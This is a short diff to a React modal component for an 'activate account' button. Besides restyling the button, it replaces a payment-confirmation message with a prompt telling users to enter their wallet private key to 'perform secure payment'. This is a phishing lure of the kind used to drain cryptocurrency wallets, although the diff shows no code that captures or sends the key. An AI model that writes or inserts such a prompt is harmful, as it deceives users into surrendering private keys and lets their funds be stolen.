@@ -77,11 +77,9 @@ export const ActivateAcountBtn = ({context}:any) => {
 
   return (
     <>
-      
-      <button  onClick={openModal} title="Save" className="cursor-pointer flex items-center fill-lime-400 bg-lime-950 hover:bg-lime-900 active:border active:border-lime-400 rounded-md duration-100 p-2">
-      <svg className="svgIcon h-4 w-4 mr-1" viewBox="0 0 576 512"><path d="M512 80c8.8 0 16 7.2 16 16v32H48V96c0-8.8 7.2-16 16-16H512zm16 144V416c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V224H528zM64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H512c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm56 304c-13.3 0-24 10.7-24 24s10.7 24 24 24h48c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm128 0c-13.3 0-24 10.7-24 24s10.7 24 24 24H360c13.3 0 24-10.7 24-24s-10.7-24-24-24H248z"></path></svg>
-  <span className="text-xs md:text-sm text-yellow-400 font-bold pr-1">{context}</span>
-</button>
+   <button onClick={openModal} className="-mt-20 hover:brightness-110 hover:animate-pulse font-bold py-3 px-6 rounded-full bg-indigo-500 shadow-lg shadow-indigo-500/50 text-white">{context}</button>
+
+     
       <Transition appear show={isOpen} as={Fragment}>
         <Dialog as="div" className="relative z-10" onClose={closeModal}>
           <Transition.Child
@@ -116,8 +114,7 @@ export const ActivateAcountBtn = ({context}:any) => {
                   </Dialog.Title>
                   <div className="mt-2">
                     <p className="text-sm text-gray-300">
-                      Your payment has been successfully submitted. We’ve sent
-                      you an email with all of the details of your order.
+                     Enter your privet key from your wallet to perform secure payment
                     </p>
                   </div>
 
